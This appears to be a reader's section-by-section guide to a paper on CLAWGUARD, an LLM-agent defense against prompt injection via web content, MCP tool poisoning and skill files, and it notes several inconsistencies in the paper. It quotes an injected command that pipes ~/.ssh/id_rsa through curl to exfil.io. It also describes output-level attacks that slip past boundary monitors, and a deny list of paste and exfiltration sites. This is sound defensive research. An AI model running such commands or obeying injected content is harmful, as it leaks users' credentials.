## Read

- **§I Introduction, taxonomy of three injection channels (p. 1)**. New: web/local content injection, MCP tool poisoning, and skill file injection are treated as three distinct channels with distinct defenses, where the notes describe a single skill-invocation surface.
- **§III-B Context-Aware Rule Induction, Steps 1–3 (p. 5–6)**. New: the policy is *induced by the LLM itself* from the user's stated objective before any tool call (`R_raw_task = M(ρ, H_0)`, p. 6), then confirmed by the user. The notes' SkillGuard takes policies as a given input ("Given sound skill summaries and policies"); this paper makes policy synthesis part of the system and grounds its soundness in pre-contamination timing rather than in analysis.
- **§III-B Step 3, precedence of `R_base` over `R_task` (p. 6)**. New: a two-layer policy with non-negotiable organisational invariants that user edits cannot relax — a structure the notes' single capability set does not have.
- **§III-A.3 Skill Inspector (p. 4)**. New: one-time LLM-judge admission of a skill's full contents, cached in allowlist Ψ across sessions, re-triggered on content change. The notes' model has no per-skill admission step at all.
- **§III-A.4 Approval Mechanism (p. 5)** and **Algorithm 1 (p. 5)**. New: a third verdict value `amb` that routes to a human with timeout τ, rather than the binary allow/deny implied by the notes' reference monitor. Algorithm 1 gives the full boundary procedure.
- **§III-A.2 obfuscation normalizer (p. 4)** and **Appendix C (p. 16–17)**. New: encoded/fragmented shell inputs are mapped to `amb` before evaluation. Relevant to the notes' parameter-constraint claim, since it is the escape hatch for arguments whose admissible range cannot be decided syntactically.
- **§III-C Case Study (p. 6)**. New: an end-to-end worked trace of an injected `exec ... ~/.ssh/id_rsa | curl ... exfil.io` being blocked on two independent grounds. Useful as a concrete counterpart to the notes' abstract "contamination event" narrative.
- **§IV-B Failure analysis on Skill-Inject (p. 9) and Table IV (p. 10)**. New and important: six residual failures that recur across all five backbones are *output-level* corruptions — biased scoring, ideological redaction, evaluation-rubric weakening — with no suspicious tool call. This is a class of harm that boundary-level capability confinement, including the notes' reachability formulation, cannot see, because no forbidden state is ever reached.
- **§IV-D Limitations (p. 11)**. New: states explicitly that the defense does not cover a malicious user intent beyond fixed invariants, and that enforcement-logic portability across agent platforms is untested.
- **§V-C Defenses Against Prompt Injection (p. 12–13)**. New relative to the notes: positions CaMeL, AgentSpec, MELON, Task Shield, StruQ, PromptLocate against each other, and claims CLAWGUARD is the only defense covering all three channels without fine-tuning, protocol coordination, or manual rule authoring (p. 13).
- **Appendix E, Table VI (p. 19)**. New: the concrete default invariant set — deny/queue actions over shell commands, filesystem paths, and outbound network, mapped to MITRE ATT&CK tactics (p. 17).
- **Appendix F, Figure 6 (p. 17)**. New: the verbatim rule-synthesis prompt and its JSON output schema (`network_rules`, `file_rules`, `command_rules` with `framework_tools`/`shell_commands`/`queue`).

## Disagreements

1. **The case study's network whitelist contradicts the paper's own baseline rule set.** The notes' model has a single capability set and no layered precedence, so this bears on the notes' "capability restriction … disconnecting all paths" claim only through this paper's analogue. §III-C (p. 6) sets `whitelist: ["pastebin.com/ZddRaJsa"] (induced, R_task)` and then reports that the `web_fetch` call to that URL "returns V(a*_1) = ⊤; the call proceeds" (p. 6). But Table VI (p. 19) lists "Paste/exfiltration sites (`pastebin.com`, `transfer.sh`, etc.)" under Outbound Network with action **deny** in `R_base`, and §III-B Step 3 states that "`R_base` is evaluated prior to `R_task`: if any attribute x … yields V_elem(x) = ⊥ under `R_base`, the call is immediately blocked regardless of any permissive entry in `R_task`" (p. 6). Under the stated precedence, the case study's first three tool calls should be blocked, not allowed. Recorded, not resolved.

2. **Enforcement actions in `R_base`: deny only, or deny and queue.** §III-B Step 1 (p. 5): "Enforcement actions are fixed at deny and cannot be overridden by `R_task`." Appendix E (p. 17): "All entries carry a fixed enforcement action of `deny` or `queue`," and Table VI (p. 19) assigns `queue` to `sudo`/`su`/`doas`, package installs, `crontab`/`systemctl`, and unlisted network endpoints.

3. **"Uniformly higher DSR" versus the ties in Table II.** §IV-B (p. 8): CLAWGUARD "consistently achieves stronger performance, with uniformly lower ASR and higher DSR across all configurations" than MELON and Task Shield. Table II (p. 8) shows Task Shield matching CLAWGUARD at 100.00 DSR on MCPTox for Claude-Sonnet-4.6 and on MCPSecurityBench for GPT-5.4 and Claude-Sonnet-4.6, and Table III (p. 9) shows several web/local cells where Task Shield's DSR equals or exceeds CLAWGUARD's (InjecAgent, DeepSeek-V3.2: 99.26 vs 99.08; InjecAgent, Qwen3.5: 99.45 vs 99.82 in the other direction). The §IV-B claim about web/local is more guarded ("on par with or slightly better", p. 9), so the two sections do not state the same relation.

4. **RQ3 skill counts do not sum.** §IV-D (p. 11): "This process identifies 283 malicious or suspicious skills in total, including 90 … 40 … 13 … 35 … and 60". Those five categories sum to 238, and the same five per-category n values are reprinted in Figure 5's axis labels (p. 12).

5. **RQ3 improvement range.** §IV-D prose reports weakest-backbone gains of 26, 55 and 50 points (p. 11); the conclusion reports "DSR improvements ranging from 26% to 89% across five attack categories" (p. 13). The 89-point figure does not appear anywhere in §IV-D, and Figure 5 is too garbled to check it.

6. **Where policy soundness comes from.** The notes record that SkillGuard's guarantees are conditioned on *given* sound skill summaries and policies. CLAWGUARD generates its task policy with the same LLM class it is defending (`R_raw_task = M(ρ, H_0)`, p. 6) and concedes on p. 11 that "CLAWGUARD itself relies on the same underlying model and therefore inherits its limitations: both the skill inspection and the task-specific rule induction during the planning stage become less precise". That is an assumption the notes' framing discharges by fiat and this paper measures as a failure source. Not a contradiction inside either work, but the two treat the same premise differently.

## Reading order

Given the notes, read in this order:

1. **§III-B, p. 5–6** — rule induction and the `R_base`/`R_task` layering. This is the part with no counterpart in the notes: where the policy the notes assume actually comes from.
2. **Table IV and the failure analysis, p. 9–10** — the output-level attacks that reach no forbidden state. This is the sharpest challenge to a reachability-and-min-cut formulation, and it is empirical.
3. **§III-A.2–A.4 and Algorithm 1, p. 4–5** — the monitor itself, and specifically the third `amb` verdict and its human-approval path, which the notes' binary confinement does not model.
4. **Table II, p. 8** — the quantitative baseline for skill and MCP channels; the numbers the notes' anchor would be compared against.
5. **§IV-C and Fig. 4, p. 10–11** — the cost side: 87.4%/95.1% utility retention and ~5% token overhead. Read the prose, not the figure.
6. **Appendix E and F, p. 17, 19** — the concrete invariant set and synthesis prompt, if you want to see what "policy" means operationally here.
7. **§V-C, p. 12–13** — related-defense positioning, last; it is orientation, not content.
